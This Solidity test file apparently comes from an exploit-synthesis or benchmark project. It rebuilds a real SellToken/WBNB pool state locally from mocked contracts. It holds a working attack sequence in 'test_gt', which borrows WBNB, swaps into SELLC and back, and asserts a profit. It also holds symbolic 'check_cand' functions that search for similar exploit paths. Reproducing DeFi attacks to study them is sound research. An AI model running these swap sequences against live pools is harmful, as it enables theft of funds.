// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {SellTokenRouter} from "./SellTokenRouter.sol";
import {SellToken} from "./SellToken.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract SellTokenTest is Test, BlockLoader {
    SellToken sellc;
    WBNB wbnb;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    SellTokenRouter srouter;
    AttackContract attackContract;
    address owner;
    address attacker;
    address sellcAddr;
    address wbnbAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address srouterAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1683961933;
    uint112 reserve0pair = 10131261910696925365107624;
    uint112 reserve1pair = 419961013712194393900;
    uint32 blockTimestampLastpair = 1683961924;
    uint256 kLastpair = 4159325301352573688381382723610973491088178532;
    uint256 price0CumulativeLastpair = 682185278574784335190748314510070123;
    uint256 price1CumulativeLastpair =
        266744938578392807947699573283293198241546079;
    uint256 totalSupplysellc = 100000000000000000000000000;
    uint256 balanceOfsellcpair = 10131261910696925365107624;
    uint256 balanceOfsellcattacker = 0;
    uint256 totalSupplywbnb = 3110714230675105092486184;
    uint256 balanceOfwbnbpair = 419961013712194393900;
    uint256 balanceOfwbnbattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        usdt = new USDT();
        usdtAddr = address(usdt);
        sellc = new SellToken();
        sellcAddr = address(sellc);
        pair = new UniswapV2Pair(
            address(sellc),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(wbnb),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0x0));
        routerAddr = address(router);
        srouter = new SellTokenRouter(
            address(wbnb),
            address(usdt),
            address(sellc),
            address(router)
        );
        srouterAddr = address(srouter);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        sellc.transfer(address(pair), balanceOfsellcpair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Sellc Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(sellc),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(sellc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(sellc),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(wbnb),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(wbnb),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(usdt),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(usdt),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(pair),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Srouter Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(srouter),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(srouter),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(srouter),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(attacker),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e6 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_sellc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        sellc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sellc_owner(uint256 amount) internal eurus {
        sellc.transfer(owner, amount);
    }

    function swap_pair_attacker_sellc_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        sellc.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_sellc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        payback_sellc_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        borrow_wbnb_owner(428 ether);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_sellc(
            (wbnb.balanceOf(address(attacker)) * 99) / 100,
            5000000 ether
        );
        printBalance("After step1 ");
        swap_pair_attacker_sellc_wbnb(
            sellc.balanceOf(address(attacker)),
            1 ether
        );
        printBalance("After step2 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt3 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
